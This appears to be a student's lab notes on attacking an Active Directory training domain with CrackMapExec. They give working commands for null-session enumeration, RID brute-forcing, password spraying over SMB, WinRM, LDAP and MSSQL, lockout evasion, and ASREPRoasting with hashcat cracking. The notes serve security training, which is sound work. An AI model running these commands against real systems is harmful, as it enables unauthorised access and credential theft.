# Gathering Information Anonymously

## Basic SMB Reconnaissance

- **SMB Enumeration**
```
crackmapexec smb 192.168.133.0/24
```

in the output, the domain parameter of the target 192.168.133.157 is the same as the name parameter, meaning the target WIN7 is not joined to the domain: inlanefreight.htb.

- **Getting all Hosts with SMB Signing Disabled**
CrackMapExec has the option to extract all hosts where SMB signing is disabled. This option is handy when we want to use Responder with ntlmrelayx.py from Impacket to perform an SMBRelay attack.
```
crackmapexec smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
```

Reference: https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

## Exploiting NULL/Anonymous Sessions

When a target is vulnerable to a NULL Session, especially a domain controller, it will allow the attacker to gather information without having a valid domain account, such as:

- Domain users (`--users`)
- Domain groups (`--groups`)
- Password policy (`--pass-pol`)
- Share folders (`--shares`)

- **Enumerating the Password Policy**
```
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol
```

- **Exporting Password Policy**
```
crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol --export $(pwd)/passpol.txt
```

- **Formating exported file**
```
sed -i "s/'/\"/g" passpol.txt
cat passpol.txt | jq
```

- **Enum users**
```
crackmapexec smb 10.129.203.121  -u '' -p '' --users --export $(pwd)/users.txt
```

```
sed -i "s/'/\"/g" users.txt
jq -r '.[]' users.txt > userslist.txt
cat userslist.txt
```

- **Enumerating Users with rid bruteforce**
This option is particularly useful when dealing with a domain that has NULL Authentication but has certain query restrictions. By using this option, we can enumerate the users and other objects in the domain.
```
crackmapexec smb 10.129.204.172  -u '' -p '' --rid-brute
```
By default, `--rid-brute` enumerate objects brute forcing RIDs up to `4000`. We can modify its behavior using `--rid-brute [MAX_RID]`.

- **Enumerating Shares**
Regarding shared folders, depending on the server configuration, we may be able to access shares by just typing the option `--shares` without any account. **If we get an error, we can try using a random name (non-existing account) or guest/anonymous without passwords to list the shared folders**.

```
crackmapexec smb 10.129.203.121 -u '' -p '' --shares
```
```
crackmapexec smb 10.129.203.121 -u guest -p '' --shares
```

### Understanding Password Policy

Reference: https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy

Reference: https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-must-meet-complexity-requirements

One of the policy settings we see in the output is `Domain Password Complex`, which is set to `1`. The Password must meet complexity requirements policy setting determines whether passwords must meet a series of strong password guidelines. When enabled, this setting requires passwords to meet the following criteria:

- Passwords may not contain the user's sAMAccountName (user account name) value or entire displayName (full name value). Both checks aren't case-sensitive.
- The password must contain characters from three of the following categories:
- - Uppercase letters of European languages (A through Z, with diacritic marks, Greek and Cyrillic characters)
  - Lowercase letters of European languages (a through z, sharp-s, with diacritic marks, Greek and Cyrillic characters)
  - Base 10 digits (0 through 9)
  - Non-alphanumeric characters (special characters): (~!@#$%^&*_-+=`|\(){}[]:;"'<>,.?/) Currency symbols such as the Euro or British Pound aren't counted as special characters for this policy setting.
  - Any Unicode character categorized as an alphabetic character but isn't uppercase or lowercase. This group includes Unicode characters from Asian languages.

> Note: Complexity requirements are enforced when passwords are changed or created.

Another crucial parameter to enumerate for a password spraying attack is the `Account Lockout Threshold`. This policy setting determines the number of failed sign-in attempts that will cause a user account to be locked. A locked account can't be used until you reset it or until the number of minutes specified by the Account Lockout Duration policy setting expires, which is also displayed in CrackMapExec output.

> Note: CrackMapExec only checks the Default Password Policy, not Password Setting Objects (PSO), if they exist.


## Password Spraying

- **Password Attack with a File with Usernames and a Single Password**
```
crackmapexec smb 10.129.203.121 -u users.txt -p Inlanefreight01!
```

- **Password Attack with a List of Usernames and a Single Password**
```
crackmapexec smb 10.129.203.121 -u noemi david grace carlos -p Inlanefreight01!
```

- **Password Attack with a List of Usernames and Two Passwords**
```
crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02!
```

- **Continue on Success**
```
crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02! --continue-on-success
```

- **Password Attack with a List of Usernames and a Password List**
```
crackmapexec smb 10.129.203.121 -u users.txt -p passwords.txt
```

- **Checking One User Equal to One Password with a Wordlist**
Another great feature of CME is if we know each user's password, and we want to test if they are still valid. For that purpose, use the option --no-bruteforce. This option will use the 1st user with the 1st password, the 2nd user with the 2nd password, and so on.
```
crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
```

- **Testing Local Accounts**
In case we would like to test a local account instead of a domain account, we can use the `--local-auth` option in CrackMapExec:

```
crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --local-auth
```

### Account Lockout
Be careful when performing Password Spraying. We need to ensure the value: `Account Lockout Threshold` is set to None. If there is a value (usually 5), be careful with the number of attempts we try on each account and observe the window in which the counter is reset to 0 (typically 30 minutes). Otherwise, there is a risk that we lock all accounts in the domain for 30 minutes or more (check the Locked Account Duration for how long this is). Occasionally a domain password policy will be set to require an administrator to manually unlock accounts which could create an even bigger issue if we lock out one or more accounts with careless Password Spraying. If you already have a user account, you can query its `Bad-Pwd-Count` attribute, which measures the number of times the user tried to log on to the account using an incorrect password.

- **Query Bad Password Count**
```
crackmapexec smb 10.129.203.121 --users -u grace -p Inlanefreight01!
```

> Note: The Bad Password Count resets if the user authenticates with the correct credentials.

## Account Status
When we test an account, there are three colors that CME can display:
- **Green**: The username and the password is valid.
- **Red**: The username or the password is invalid.
- **Magenta**: The username and password are valid, but the authentication is not successful.

Authentication can be unsuccessful while the password is still valid for various reasons. Here is a complete list:
- STATUS_ACCOUNT_DISABLED
- STATUS_ACCOUNT_EXPIRED
- STATUS_ACCOUNT_RESTRICTION
- STATUS_INVALID_LOGON_HOURS
- STATUS_INVALID_WORKSTATION
- STATUS_LOGON_TYPE_NOT_GRANTED
- STATUS_PASSWORD_EXPIRED
- STATUS_PASSWORD_MUST_CHANGE
- STATUS_ACCESS_DENIED

Depending on the reason, for example, `STATUS_INVALID_LOGON_HOURS` or `STATUS_INVALID_WORKSTATION` may be a good idea to try another workstation or another time. In the case of the message `STATUS_PASSWORD_MUST_CHANGE`, we can change the user's password using Impacket `smbpasswd` like: `smbpasswd -r domain -U user`.

- **Changing Password for an Account with Status `PASSWORD_MUST_CHANGE`**
```
smbpasswd -r 10.129.203.121 -U peter
```

## Target Protocol WinRM

To connect to the WinRM service on a remote computer, we need to have local administrator privileges, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration.

WinRM is not the best protocol to identify if a password is valid because it will only indicate that the account is valid if it has access to WinRM.

- **WinRM - Password Spraying**
```
crackmapexec winrm 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
```

## LDAP - Password Spraying

When doing Password Spraying against the LDAP protocol, we **need to use the FQDN** otherwise, we will receive an error:

Error when using the IP:
```
crackmapexec ldap 10.129.203.121 -u julio grace -p Inlanefreight01!
```

We have two options to solve this issue: configure our attack host to use the domain name server (DNS) or configure the KDC FQDN in our `/etc/hosts` file. Let's go with the second option and add the FQDN to our `/etc/hosts` file:


1. Adding the FQDN to the hosts file and Performing a Password Spray
2. Spray:
```
crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p Inlanefreight01!
```

## MSSQL Authentication Mechanisms

MSSQL supports two authentication modes, which means that users can be created in Windows or the SQL Server:
- Windows authentication mode	This is the default, often referred to as integrated security, because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.
- Mixed mode	Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.


This means that we can have three types of users to authenticate to MSSQL:
1. Active Directory Account.
2. Local Windows Account.
3. SQL Account.


- **Password Spray - Active Directory Account**
For an Active Directory account, we need to specify the domain name:
```
crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01! -d inlanefreight.htb
```

- **Password Spray - Local Windows Account**
For a local Windows Account, we need to specify a dot (.) as the domain option -d or the target machine name:
```
crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! -d .
```

- **Password Spray - SQL Account**
If we want to try a SQL Account, we need to specify the flag `--local-auth`
```
crackmapexec mssql 10.129.203.121 -u julio grace  -p Inlanefreight01! --local-auth
```

## Finding ASREPRoastable Accounts

The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key derived from its password. Then, using this message, the user password could be cracked offline if the user chose a relatively weak password.

- **Bruteforcing Accounts for ASREPRoast**
We can use the LDAP protocol with the list of users we previously found with the option `--asreproast` followed by a file name and specify the **FQDN** of the DC as a target. We will search for each account inside the file `users.txt` to identify if there is a least one account vulnerable to this attack:
```
crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast asreproast.out
```

Based on our list, we found one account vulnerable to ASREPRoasting. We can request all accounts that do not require Kerberos pre-authentication if we have valid credentials. Let's use Grace's credentials to request all accounts vulnerable to ASREPRoast.

- **Search for ASREPRoast Accounts**
```
crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --asreproast asreproast.out
```
```
hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt
```

if doens't work run netexec
```
nxc ldap 10.129.191.62 -u grace -p Inlanefreight01! --asreproast output.txt
```

Reference: https://www.netexec.wiki/ldap-protocol/asreproast

